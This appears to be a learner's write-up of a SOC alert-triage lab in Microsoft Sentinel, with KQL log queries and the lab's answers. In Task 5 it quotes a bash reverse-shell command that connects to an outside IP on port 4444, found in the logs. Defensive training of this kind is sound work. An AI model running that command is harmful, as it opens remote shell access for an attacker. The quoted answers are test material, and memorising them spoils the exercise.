# SOC Alert Triaging - Tinsel Triage
> Investigate and triage alerts through Microsoft Sentinel.

## Task 1: Introduction
- I am asked to sign into Azure portal using a temp user and pass
- I did that and went to second part

## Task 2: Alert Triaging Primer
- I am given a basic intro to Alert Triaging
- There are some fundamental factors on which we divide and evaluate errors
- These include things like Severity Level, Timestamp and Frequency, Attack Stage and Affected Asset
- Then we later dive deeper into errors in the order as we identified above
- In a nutshell we try to connect the dots by checking relavent info to these errors and correlating if any of them are related
- Also one of the main part is documenting this, either for higher up teams or future references

## Task 3: Environment Review
- I am given basics on how to navigate through Azure portal
- First I am asked to location `Microsoft Sentinel`
- Then click on logs option and then custom and run the query to view the logs

## Task 4: Investigation Proper
- I was asked to navigate to Incidents tab and I later selected the given custom range to see alerts
<img width="2211" height="1286" alt="image" src="https://github.com/user-attachments/assets/4407e630-bf89-4c82-80b0-4b3ae2de90f4" />

- I searched for `Linux PrivEsc - Kernel Module Insertion` and found 3 events in this error, with 3 entities involved and it was also clasified as Privilege Escalation tactic
- When we click on view full details, we can also see related errors and a timeline of this
- We can backtrack this whole path to find the initial response and connect all the dots to figure out the whole incidence

### Answers:
- For first Q I searched `Linux PrivEsc - Polkit Exploit Attempt` and clicked on it, the sidebar showed `10` entities were affected by it, which is the answer
- I searched for ` Linux PrivEsc - Sudo Shadow Access` and the first column showed it is `High` severity which is answer
- If we go to full details tab and look at number of entities then it is `4` Account types

## Task 5: Diving Deeper Into Logs
- We can go deeper in investigatig these logs by clicking on events tab in full detail view
- We can see more details such as name and time it was installed
- We can also use `KQL mode` to query specific stuff
- Thus after running something like:
```
set query_now = datetime(2025-10-30T05:09:25.9886229Z);
Syslog_CL
| where host_s == 'app-02'
| project _timestamp_t, host_s, Message
```
- We can investigate the kernel and see commands that were performed and filter out the suspicious ones

### Answers:
- First I used KQL mode to query the following as taught above (with a custom range):
```
set query_now = datetime(2025-10-30T05:09:25.9886229Z);
Syslog_CL
| where host_s == 'websrv-01'
| project _timestamp_t, host_s, Message
```
- I went to the first query which was about kernel and the message had the name `malicious_mod.ko` in it
- There was only one command related to `ops` i.e `bin/bash -i >& /dev/tcp/198.51.100.22/4444 0>&1`
- Top second query had to ssh query with `172.16.0.12` IP
- I switched the query to:
```
set query_now = datetime(2025-10-30T05:09:25.9886229Z);
Syslog_CL
| where host_s == 'app-01'
| project _timestamp_t, host_s, Message
```
- Now the ssh query had the IP: `203.0.113.45`
- Aside from backupuser, `deploy` was added
